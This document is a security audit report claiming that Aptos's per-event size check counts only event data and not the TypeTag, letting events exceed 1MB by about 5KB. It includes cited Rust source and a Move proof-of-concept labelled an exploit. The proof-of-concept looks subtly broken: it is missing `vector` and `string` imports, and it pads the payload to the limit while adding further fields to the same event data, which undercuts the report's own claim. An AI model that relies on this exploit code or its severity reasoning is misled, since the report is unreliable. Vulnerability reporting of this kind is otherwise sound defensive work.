# Audit Report

## Title
Event Size Validation Bypass Through TypeTag Size Exclusion

## Summary
The event size validation in `ChangeSetConfigs::check_change_set()` only validates the `event_data` length but not the full serialized `ContractEvent` size, allowing events to exceed the intended 1MB limit by up to ~5KB through complex TypeTag structures.

## Finding Description
The security question asks about pointer/reference bypass, but Move's memory model makes that specific attack impossible. However, there is a related **size validation discrepancy vulnerability**.

When V2 events are created and validated, three different size measurements occur at different stages:

1. **Event Creation**: `ContractEvent::new_v2()` only validates that `event.size()` is computable, not that it's within limits [1](#0-0) 

2. **Size Validation**: `ChangeSetConfigs::check_change_set()` validates ONLY `event.event_data().len()` against `max_bytes_per_event` (1MB) [2](#0-1) 

3. **Storage Serialization**: The full `ContractEvent` is BCS-serialized including TypeTag, event_data, and overhead [3](#0-2) 

The `ContractEventV2::size()` method correctly calculates the total size including TypeTag: [4](#0-3) 

However, the validation in `check_change_set()` only checks the event_data portion. This allows an attacker to create events with:
- `event_data`: 1MB - 1 byte (passes validation)
- `TypeTag`: up to ~5KB (within `type_max_cost` limit of 5000)
- Total stored size: ~1MB + 5KB

The TypeTag size is bounded by the type complexity limits enforced during type-to-tag conversion: [5](#0-4) 

With production configuration values (`type_max_cost=5000`, `type_base_cost=100`, `type_byte_cost=1`), a TypeTag can consume up to 5000 cost units, translating to approximately 5KB of serialized data. [6](#0-5) 

**Attack Path:**
1. Attacker creates a Move module with an event struct having complex generic type parameters (e.g., deeply nested structs with long identifiers)
2. Emits event with `event_data` = 1,048,575 bytes (just under 1MB limit)
3. The TypeTag for the complex type serializes to ~5KB
4. Validation passes because only `event_data.len()` < 1MB is checked
5. Storage writes ~1.005MB of data (event_data + TypeTag + BCS overhead)

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation
**Severity: Medium** per Aptos bug bounty criteria - "State inconsistencies requiring intervention"

While users pay correct gas (since gas calculation uses the full `event.size()`), the validation logic fails to enforce the intended storage limit: [7](#0-6) 

**Impact:**
- Storage bloat: ~0.5% overflow per event (5KB extra on 1MB)
- Transaction outputs can exceed expected size bounds
- Accumulated over many transactions, could cause database growth beyond expected parameters
- Does NOT cause consensus issues (deterministic across all nodes)
- Does NOT cause gas undercharging (users pay for actual size)

## Likelihood Explanation
**Likelihood: Medium-High**

Exploitation requires:
- Basic Move programming knowledge
- Ability to create structs with complex generic parameters
- No special permissions required

The attack is deterministic and can be performed by any transaction sender. The TypeTag complexity is naturally limited by existing VM constraints, but within those bounds, the bypass is straightforward.

## Recommendation
Modify the size validation in `ChangeSetConfigs::check_change_set()` to check the full serialized event size rather than just the event_data length:

```rust
// In aptos-move/aptos-vm-types/src/storage/change_set_configs.rs
let mut total_event_size = 0;
for event in change_set.events_iter() {
    // Check FULL serialized size, not just event_data
    let size = event.size() as u64;  // Uses ContractEvent::size() which includes TypeTag
    if size > self.max_bytes_per_event {
        return storage_write_limit_reached(None);
    }
    total_event_size += size;
    if total_event_size > self.max_bytes_all_events_per_transaction {
        return storage_write_limit_reached(None);
    }
}
```

This ensures validation matches the actual gas calculation and storage requirements.

## Proof of Concept
```move
// File: sources/exploit_event.move
module attacker::exploit {
    use std::string::String;
    use aptos_framework::event;

    // Create a deeply nested generic type to maximize TypeTag size
    struct Level1<T> has drop, store { data: T }
    struct Level2<T1, T2> has drop, store { d1: T1, d2: T2 }
    struct Level3<T1, T2, T3> has drop, store { d1: T1, d2: T2, d3: T3 }
    
    #[event]
    struct LargeEvent<T1, T2, T3, T4, T5, T6, T7, T8> has drop, store {
        // Event data just under 1MB
        payload: vector<u8>,
        // Complex generic parameters to maximize TypeTag size
        t1: T1, t2: T2, t3: T3, t4: T4,
        t5: T5, t6: T6, t7: T7, t8: T8,
    }

    public entry fun emit_oversized_event() {
        // Create event_data close to 1MB limit
        let large_payload = vector::empty<u8>();
        let i = 0;
        while (i < 1048575) { // 1MB - 1 byte
            vector::push_back(&mut large_payload, 0u8);
            i = i + 1;
        };
        
        // Emit event with complex TypeTag
        event::emit(LargeEvent<
            Level3<String, String, String>,
            Level3<String, String, String>,
            Level3<String, String, String>,
            Level2<String, String>,
            Level2<String, String>,
            Level2<String, String>,
            Level1<String>,
            Level1<String>
        > {
            payload: large_payload,
            t1: Level3 { d1: string::utf8(b""), d2: string::utf8(b""), d3: string::utf8(b"") },
            t2: Level3 { d1: string::utf8(b""), d2: string::utf8(b""), d3: string::utf8(b"") },
            t3: Level3 { d1: string::utf8(b""), d2: string::utf8(b""), d3: string::utf8(b"") },
            t4: Level2 { d1: string::utf8(b""), d2: string::utf8(b"") },
            t5: Level2 { d1: string::utf8(b""), d2: string::utf8(b"") },
            t6: Level2 { d1: string::utf8(b""), d2: string::utf8(b"") },
            t7: Level1 { data: string::utf8(b"") },
            t8: Level1 { data: string::utf8(b"") },
        });
    }
}
```

This PoC creates an event that passes validation (event_data < 1MB) but whose total serialized size including the complex TypeTag exceeds the 1MB limit.

**Notes**

The original security question asks about "pointers or references to large external data," which is not possible in Move's memory model. BCS serialization is complete and does not use pointers. However, the investigation revealed a real vulnerability: a discrepancy between what is validated (event_data only) versus what is stored (full ContractEvent including TypeTag). This allows the 1MB per-event size limit to be bypassed by approximately 0.5%, enabling storage bloat beyond intended resource limits.

### Citations

**File:** types/src/contract_event.rs (L257-266)
```rust
    pub fn new(type_tag: TypeTag, event_data: Vec<u8>) -> anyhow::Result<Self> {
        let event = Self {
            type_tag,
            event_data,
        };

        // Ensure size of event is "computable".
        event.size()?;
        Ok(event)
    }
```

**File:** types/src/contract_event.rs (L268-271)
```rust
    pub fn size(&self) -> anyhow::Result<usize> {
        let size = bcs::serialized_size(&self.type_tag)? + self.event_data.len();
        Ok(size)
    }
```

**File:** aptos-move/aptos-vm-types/src/storage/change_set_configs.rs (L115-120)
```rust
        let mut total_event_size = 0;
        for event in change_set.events_iter() {
            let size = event.event_data().len() as u64;
            if size > self.max_bytes_per_event {
                return storage_write_limit_reached(None);
            }
```

**File:** storage/aptosdb/src/schema/event/mod.rs (L49-57)
```rust
impl ValueCodec<EventSchema> for ContractEvent {
    fn encode_value(&self) -> Result<Vec<u8>> {
        bcs::to_bytes(self).map_err(Into::into)
    }

    fn decode_value(data: &[u8]) -> Result<Self> {
        bcs::from_bytes(data).map_err(Into::into)
    }
}
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_tag_converter.rs (L15-63)
```rust
struct PseudoGasContext {
    // Parameters for metering type tag construction:
    //   - maximum allowed cost,
    //   - base cost for any type to tag conversion,
    //   - cost for size of a struct tag.
    max_cost: u64,
    cost: u64,
    cost_base: u64,
    cost_per_byte: u64,
}

impl PseudoGasContext {
    fn new(vm_config: &VMConfig) -> Self {
        Self {
            max_cost: vm_config.type_max_cost,
            cost: 0,
            cost_base: vm_config.type_base_cost,
            cost_per_byte: vm_config.type_byte_cost,
        }
    }

    fn current_cost(&mut self) -> u64 {
        self.cost
    }

    fn charge_base(&mut self) -> PartialVMResult<()> {
        self.charge(self.cost_base)
    }

    fn charge_struct_tag(&mut self, struct_tag: &StructTag) -> PartialVMResult<()> {
        let size =
            (struct_tag.address.len() + struct_tag.module.len() + struct_tag.name.len()) as u64;
        self.charge(size * self.cost_per_byte)
    }

    fn charge(&mut self, amount: u64) -> PartialVMResult<()> {
        self.cost += amount;
        if self.cost > self.max_cost {
            Err(
                PartialVMError::new(StatusCode::TYPE_TAG_LIMIT_EXCEEDED).with_message(format!(
                    "Exceeded maximum type tag limit of {} when charging {}",
                    self.max_cost, amount
                )),
            )
        } else {
            Ok(())
        }
    }
}
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L246-249)
```rust
        // 5000 limits type tag total size < 5000 bytes and < 50 nodes.
        type_max_cost: 5000,
        type_base_cost: 100,
        type_byte_cost: 1,
```

**File:** aptos-move/aptos-vm-types/src/storage/io_pricing.rs (L296-301)
```rust
    pub fn io_gas_per_event(
        &self,
        event: &ContractEvent,
    ) -> impl GasExpression<VMGasParameters, Unit = InternalGasUnit> + use<> {
        STORAGE_IO_PER_EVENT_BYTE_WRITE * NumBytes::new(event.size() as u64)
    }
```
